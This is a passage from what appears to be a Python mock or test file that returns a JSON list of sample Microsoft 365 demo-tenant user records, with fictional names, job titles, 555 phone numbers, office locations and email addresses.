            "jobTitle": "Corporate Security Officer",
            "mail": "AllanD@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "24/1106",
            "preferredLanguage": "en-US",
            "surname": "Deyoung",
            "userPrincipalName": "AllanD@M365x214355.onmicrosoft.com",
            "id": "c03e6eaa-b6ab-46d7-905b-73ec7ea1f755"
        },
        {
            "businessPhones": [],
            "displayName": "Conf Room Baker",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Baker@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Baker@M365x214355.onmicrosoft.com",
            "id": "013b7b1b-5411-4e6e-bdc9-c4790dae1051"
        },
        {
            "businessPhones": [
                "+1 732 555 0102"
            ],
            "displayName": "Ben Walters",
            "givenName": "Ben",
            "jobTitle": "VP Sales",
            "mail": "BenW@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "19/3123",
            "preferredLanguage": "en-US",
            "surname": "Walters",
            "userPrincipalName": "BenW@M365x214355.onmicrosoft.com",
            "id": "f5289423-7233-4d60-831a-fe107a8551cc"
        },
        {
            "businessPhones": [],
            "displayName": "Brian Johnson (TAILSPIN)",
            "givenName": "Brian",
            "jobTitle": "null",
            "mail": "BrianJ@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "Johnson",
            "userPrincipalName": "BrianJ@M365x214355.onmicrosoft.com",
            "id": "e46ba1a2-59e7-4019-b0fa-b940053e0e30"
        },
        {
            "businessPhones": [
                "+1 858 555 0111"
            ],
            "displayName": "Christie Cline",
            "givenName": "Christie",
            "jobTitle": "Sr. VP Sales & Marketing",
            "mail": "ChristieC@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "131/2105",
            "preferredLanguage": "en-US",
            "surname": "Cline",
            "userPrincipalName": "ChristieC@M365x214355.onmicrosoft.com",
            "id": "b66ecf79-a093-4d51-86e0-efcc4531f37a"
        },
        {
            "businessPhones": [],
            "displayName": "Conf Room Crystal",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Crystal@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Crystal@M365x214355.onmicrosoft.com",
            "id": "8528d6e9-dce3-45d1-85d4-d2db5f738a9f"
        },
        {
            "businessPhones": [
                "+1 425 555 0105"
            ],
            "displayName": "Debra Berger",
            "givenName": "Debra",
            "jobTitle": "Administrative Assistant",
            "mail": "DebraB@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "18/2107",
            "preferredLanguage": "en-US",
            "surname": "Berger",
            "userPrincipalName": "DebraB@M365x214355.onmicrosoft.com",
            "id": "d4957c9d-869e-4364-830c-d0c95be72738"
        },
        {
            "businessPhones": [
                "+1 205 555 0108"
            ],
            "displayName": "Diego Siciliani",
            "givenName": "Diego",
            "jobTitle": "CVP Finance",
            "mail": "DiegoS@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "14/1108",
            "preferredLanguage": "en-US",
            "surname": "Siciliani",
            "userPrincipalName": "DiegoS@M365x214355.onmicrosoft.com",
            "id": "24fcbca3-c3e2-48bf-9ffc-c7f81b81483d"
        },
        {
            "businessPhones": [
                "+81 345550115"
            ],
            "displayName": "Emily Braun",
            "givenName": "Emily",
            "jobTitle": "Budget Analyst",
            "mail": "EmilyB@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "97/2302",
            "preferredLanguage": "en-US",
            "surname": "Braun",
            "userPrincipalName": "EmilyB@M365x214355.onmicrosoft.com",
            "id": "2804bc07-1e1f-4938-9085-ce6d756a32d2"
        },
        {
            "businessPhones": [
                "+1 205 555 0103"
            ],
            "displayName": "Enrico Cattaneo",
            "givenName": "Enrico",
            "jobTitle": "Attorney",
            "mail": "EnricoC@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "14/1102",
            "preferredLanguage": "en-US",
            "surname": "Cattaneo",
            "userPrincipalName": "EnricoC@M365x214355.onmicrosoft.com",
            "id": "16cfe710-1625-4806-9990-91b8f0afee35"
        },
        {
            "businessPhones": [
                "+1 309 555 0104"
            ],
            "displayName": "Grady Archie",
            "givenName": "Grady",
            "jobTitle": "CVP Legal",
            "mail": "GradyA@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "19/2109",
            "preferredLanguage": "en-US",
            "surname": "Archie",
            "userPrincipalName": "GradyA@M365x214355.onmicrosoft.com",
            "id": "df043ff1-49d5-414e-86a4-0c7f239c36cf"
        },
        {
            "businessPhones": [
                "+1 954 555 0118"
            ],
            "displayName": "Henrietta Mueller",
            "givenName": "Henrietta",
            "jobTitle": "Marketing Assistant",
            "mail": "HenriettaM@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "18/1106",
            "preferredLanguage": "en-US",
            "surname": "Mueller",
            "userPrincipalName": "HenriettaM@M365x214355.onmicrosoft.com",
            "id": "c8913c86-ceea-4d39-b1ea-f63a5b675166"
        },
        {
            "businessPhones": [],
            "displayName": "Conf Room Hood",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Hood@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Hood@M365x214355.onmicrosoft.com",
            "id": "3fec04fc-e036-42f4-8f6f-b3b02288085c"
        },
        {
            "businessPhones": [
                "+1 309 555 0101"
            ],
            "displayName": "Irvin Sayers",
            "givenName": "Irvin",
            "jobTitle": "Director",
            "mail": "IrvinS@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "19/2106",
            "preferredLanguage": "en-US",
            "surname": "Sayers",
            "userPrincipalName": "IrvinS@M365x214355.onmicrosoft.com",
            "id": "baafca12-9874-4765-9576-e0e5cafe491b"
        },
        {
            "businessPhones": [
                "+1 918 555 0101"
            ],
            "displayName": "Isaiah Langer",
            "givenName": "Isaiah",
            "jobTitle": "Web Marketing Manager",
            "mail": "IsaiahL@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "20/1101",
            "preferredLanguage": "en-US",
            "surname": "Langer",
            "userPrincipalName": "IsaiahL@M365x214355.onmicrosoft.com",
            "id": "e3d0513b-449e-4198-ba6f-bd97ae7cae85"
        },
        {
            "businessPhones": [
                "+1 502 555 0102"
            ],
            "displayName": "Johanna Lorenz",
            "givenName": "Johanna",
            "jobTitle": "CVP Engineering",
            "mail": "JohannaL@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "23/2102",
            "preferredLanguage": "en-US",
            "surname": "Lorenz",
            "userPrincipalName": "JohannaL@M365x214355.onmicrosoft.com",
            "id": "626cbf8c-5dde-46b0-8385-9e40d64736fe"
        },
        {
            "businessPhones": [
                "+1 980 555 0101"
            ],
            "displayName": "Joni Sherman",
            "givenName": "Joni",
            "jobTitle": "Paralegal",
            "mail": "JoniS@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "20/1109",
            "preferredLanguage": "en-US",
            "surname": "Sherman",
            "userPrincipalName": "JoniS@M365x214355.onmicrosoft.com",
            "id": "8b209ac8-08ff-4ef1-896d-3b9fde0bbf04"
        },
        {
            "businessPhones": [
                "+1 913 555 0101"
            ],
            "displayName": "Lee Gu",
            "givenName": "Lee",
            "jobTitle": "CVP Research & Development",
            "mail": "LeeG@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "23/3101",
            "preferredLanguage": "en-US",
            "surname": "Gu",
            "userPrincipalName": "LeeG@M365x214355.onmicrosoft.com",
            "id": "074e56ea-0b50-4461-89e5-c67ae14a2c0b"
        },
        {
            "businessPhones": [
                "+1 918 555 0107"
            ],
            "displayName": "Lidia Holloway",
            "givenName": "Lidia",
            "jobTitle": "Product Manager",
            "mail": "LidiaH@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "20/2107",
            "preferredLanguage": "en-US",
            "surname": "Holloway",
            "userPrincipalName": "LidiaH@M365x214355.onmicrosoft.com",
            "id": "2ed03dfd-01d8-4005-a9ef-fa8ee546dc6c"
        },
        {
            "businessPhones": [
                "+1 918 555 0104"
            ],
            "displayName": "Lynne Robbins",
            "givenName": "Lynne",
            "jobTitle": "Product Manager",
            "mail": "LynneR@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "20/1104",
            "preferredLanguage": "en-US",
            "surname": "Robbins",
            "userPrincipalName": "LynneR@M365x214355.onmicrosoft.com",
            "id": "e8a02cc7-df4d-4778-956d-784cc9506e5a"
        },
        {
            "businessPhones": [
                "+1 412 555 0109"
            ],
            "displayName": "Megan Bowen",
            "givenName": "Megan",
            "jobTitle": "Auditor",
            "mail": "MeganB@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "12/1110",
            "preferredLanguage": "en-US",
            "surname": "Bowen",
            "userPrincipalName": "MeganB@M365x214355.onmicrosoft.com",
            "id": "48d31887-5fad-4d73-a9f5-3c356e68a038"
        },
        {
            "businessPhones": [
                "+1 858 555 0109"
            ],
            "displayName": "Miriam Graham",
            "givenName": "Miriam",
            "jobTitle": "VP Marketing",
            "mail": "MiriamG@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "131/2103",
            "preferredLanguage": "en-US",
            "surname": "Graham",
            "userPrincipalName": "MiriamG@M365x214355.onmicrosoft.com",
            "id": "08fa38e4-cbfa-4488-94ed-c834da6539df"
        },
        {
            "businessPhones": [
                "+1 206 555 0105"
            ],
            "displayName": "Nestor Wilke",
            "givenName": "Nestor",
            "jobTitle": "CVP Operations",
            "mail": "NestorW@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "36/2121",
            "preferredLanguage": "en-US",
            "surname": "Wilke",
            "userPrincipalName": "NestorW@M365x214355.onmicrosoft.com",
            "id": "089a6bb8-e8cb-492c-aa41-c078aa0b5120"
        },
        {
            "businessPhones": [
                "+1 502 555 0144"
            ],
            "displayName": "Patti Fernandez",
            "givenName": "Patti",
            "jobTitle": "President",
            "mail": "PattiF@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "15/1102",
            "preferredLanguage": "en-US",
            "surname": "Fernandez",
            "userPrincipalName": "PattiF@M365x214355.onmicrosoft.com",
            "id": "40079818-3808-4585-903b-02605f061225"
        },
        {
            "businessPhones": [
                "+20 255501070"
            ],
            "displayName": "Pradeep Gupta",
            "givenName": "Pradeep",
            "jobTitle": "Accountant II",
            "mail": "PradeepG@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "98/2202",
            "preferredLanguage": "en-US",
            "surname": "Gupta",
            "userPrincipalName": "PradeepG@M365x214355.onmicrosoft.com",
            "id": "ec63c778-24e1-4240-bea3-d12a167d5232"
        },
        {
            "businessPhones": [],
            "displayName": "Conf Room Rainier",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Rainier@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Rainier@M365x214355.onmicrosoft.com",
            "id": "6f1c452b-f9f4-4f43-8c42-17e30ab0077c"
        },
        {
            "businessPhones": [],
            "displayName": "Conf Room Stevens",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Stevens@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Stevens@M365x214355.onmicrosoft.com",
            "id": "5c7188eb-da70-4f1a-a8a5-afc26c2fe22c"
        }
    ]
}
    ]
    return json.dumps(result)